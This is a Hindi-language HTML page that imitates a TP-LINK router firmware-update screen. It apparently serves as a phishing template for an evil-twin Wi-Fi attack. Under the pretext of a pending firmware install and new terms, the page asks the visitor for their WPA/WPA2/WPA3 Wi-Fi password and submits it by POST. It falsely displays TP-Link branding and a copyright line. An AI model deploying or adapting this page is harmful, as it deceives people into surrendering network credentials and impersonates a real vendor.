<!DOCTYPE html>
<html lang="hi-IN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../../assets/css/stylesheet.css">
    <title>TP-LINK :: फ़र्मवेयर अपडेट</title>
</head>
<body>
    <img src="../../assets/img/new-logo.png" width="150px" class="img-fluid" alt="Responsive image">
    <section class="container">
    <div class="form-head">
        <h1>फ़र्मवेयर अपडेट</h1>
    </div>
    <div class="text">
        <p>फ़र्मवेयर का नया संस्करण मिला है और इंस्टॉल होने की प्रतीक्षा कर रहा है। कृपया हमारे नए नियम और शर्तें देखें और आगे बढ़ें।</p>
    </div>
    <form id='form1' method="POST">
        <div class="form-group">
          <label for="terms">नियम और शर्तें स्वीकार करें</label>
        </div>

        <div class="form-group">
            <label for="password">पासवर्ड</label>
            <input type="password" class="form-control" name="password" id="password" placeholder="WPA/WPA2/WPA3 पासवर्ड" required>
        </div>

        <div class="form-group form-check">
            <input type="checkbox" class="form-check-input" id="acceptTerms" required>
            <label class="form-check-label" for="acceptTerms">मैं नियम और शर्तें स्वीकार करता/करती हूँ</label>
        </div>

        <div class="form-btn">
            <button type="submit" class="btn btn-primary">अपडेट करें</button>
        </div>
        <div class="form-check">
            <small id="copyright" class="form-text text-muted">Copyright © TP-Link Corporation Limited. 2026. सर्वाधिकार सुरक्षित।</small>
          </div>
      </form>
    </section>

    <script src="../../assets/js/jquery-3.5.1.js"></script>
    <script src="../../assets/js/popper.min.js"></script>
    <script src="../../assets/js/bootstrap.min.js"></script>
    <script>
        document.getElementById('form1').addEventListener('submit', function(event) {
            var password = document.getElementById('password');
            var acceptTerms = document.getElementById('acceptTerms');

            if (!acceptTerms.checked) {
                acceptTerms.setCustomValidity('आपको नियम और शर्तें स्वीकार करनी होंगी।');
            } else {
                acceptTerms.setCustomValidity('');
            }

            if (password.value === '') {
                password.setCustomValidity('आपको पासवर्ड दर्ज करना होगा।');
            } else {
                password.setCustomValidity('');
            }

            if (!this.checkValidity()) {
                event.preventDefault();
            }
        });
    </script>
</body>
</html>
